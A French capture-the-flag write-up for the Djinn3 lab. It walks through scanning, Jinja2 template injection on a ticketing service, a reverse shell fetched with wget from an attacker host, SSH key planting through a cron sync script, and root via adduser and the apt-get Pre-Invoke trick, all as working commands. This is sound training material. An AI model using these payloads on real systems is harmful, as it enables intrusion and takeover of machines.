  # Djinn3

	sudo masscan -p1-65535,U:1-65535 192.168.203.102 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.203.102 -oN nmap.txt
	feroxbuster --silent -u http://192.168.203.102

	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http lighttpd 1.4.45  
	5000/tcp open http Werkzeug httpd 1.0.1 (Python 3.6.9)  
	31337/tcp open Elite? 
 	

Rien sur le site web du port 80 à part un dossier /images qui sort une erreur 403.
Sur le port 5000 on trouve un site web dédié au ticketing. On peut faire planter le serveur en allant sur des URL du type http://192.168.203.102:5000/?id=-1 ou http://192.168.203.102:5000/?id="

J'ai tenté de faire du fuzzing sur les numéros de tickets : 
	
	seq 1 9999 > nombres.txt
	ffuf -u http://192.168.203.102:5000/?id=FUZZ -w ./nombres.txt -fc 500

Sans succès, aucun ticket supplémentaire caché.

Mais le ticket 4567 mentionne un utilisateur "guest" ainsi qu'un utilisateur "Jack" et cela pourrait servir.

Sur le port 31337 il y a une interface qui demande des credentials quand on s'y connecte avec Netcat. Le couple "guest" / "guest" a fonctionné : 

	nc 192.168.203.102 31337
	username> guest  
	password> guest
	> help
	> open  
	Title: "aaaa"  
	Description: "aaaa"
	>

J'ai créé un ticket et j'ai vérifié qu'il atterrissait bien sur le système de ticketing, c'est le cas et cela ouvre la porte à beaucoup de possibilités. On sait grâce aux scans que l'interface du port 5000 est sous Python, je me suis donc d'abord orienté vers les SSTI : 

	> open  
	Title: {{1+1}}  
	Description: {{1+1}}

En allant ensuite sur http://192.168.203.102:5000/?id=1526 je vois que le titre a été recopié tel quel mais que la description a été interprétée. On tient le point d'entrée. 
</br>Voir : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution 

	> open  
	Title: id  
	Description: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

Cela fonctionne et j'obtiens le résultat prévu, plus qu'à terminer l'exploitation avec un reverse-shell : 

	> open
	Title: download
	Description: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('wget http://192.168.45.165/shell').read() }}
	> open
	Title: ls
	Description: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
	> open
	Title: chmod
	Description: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('chmod 777 ./shell').read() }}
	> open
	Title: execution
	Description: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('./shell').read() }}
	
J'obtiens la connexion et le premier flag : 

	rlwrap nc -nvlp 443
	...
	python -c 'import pty;pty.spawn("/bin/bash")'
	whoami
	cat ~/local.txt	
	
### Pivoting et élévation de privilèges : 

	wget http://192.168.45.165/linpeas.sh
	wget http://192.168.45.165/pspy64
	chmod u+x *
	./linpeas.sh > res.txt
	less -R res.txt
	./pspy64

On voit des fichiers .pyc dans le dossier parent /opt/ 

	strings .configuration.cpython-38.pyc
	strings .syncer.cpython-38.pyc

Il y a quelques morceaux intéressants dedans, qui mentionnent des fichiers de configuration avec des wildcards. Apparemment le premier script lit régulièrement des fichiers JSON dans le répertoire de Saint et dans /tmp/ : 

> /home/saint/\*.json
> </br>/tmp/\*.json

En téléchargeant et décompilant ces fichiers avec Uncompyle on y voit plus clair : 

	...
	def main():
	    """Main function
	 Cron job is going to make my work easy peasy
	 """
	    configPath = ConfigReader.set_config_path()
	    config = ConfigReader.read_config(configPath)
	    connections = checker(config)
	    if 'FTP' in connections:
	        ftpcon(config['FTP'])
	    else:
	        if 'SSH' in connections:
	            sshcon(config['SSH'])
	        else:
	            if 'URL' in connections:
	                sync(config['URL'], config['Output'])
	...	    

Il faut créer un fichier JSON dans /tmp avec notre clé SSH hébergée sur un serveur web pour que le script la copie :

	cd ~/.ssh
	python -m http.server 8000
	==========
	echo "{" >> /tmp/18-07-2020.config.json
	echo '"URL": "http://192.168.45.165:8000/id_rsa.pub",' >> /tmp/18-07-2020.config.json
	echo '"Output": "/home/saint/.ssh/authorized_keys"' >> /tmp/18-07-2020.config.json
	echo "}" >> /tmp/18-07-2020.config.json

	
Le format du nom de fichier n'est pas libre mais se déduit de l'autre fichier JSON, je n'ai pas recopié tout le code.
</br>Attendre quelques minutes pour que la tâche planifiée télécharge la clé.

	ssh saint@192.168.203.102
	sudo -l 

> User saint may run the following commands on djinn3:
> </br>&nbsp;&nbsp;&nbsp;&nbsp; (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

	sudo /usr/sbin/adduser tim --gid 0
	su tim -
	cat /etc/sudoers

On voit une ligne intéressante à la fin : 

> jason ALL=(root) PASSWD: /usr/bin/apt-get
	
Visiblement il existait un utilisateur Jason qui avait ce droit, mais il n'existe plus. Et grâce à https://gtfobins.github.io/#apt on sait que si on peut recréer cet utilisateur, on pourra devenir root : 

	sudo adduser jason --gid=0
	exit
	ssh jason@192.168.203.102
	sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
	cat /root/proof.txt
	
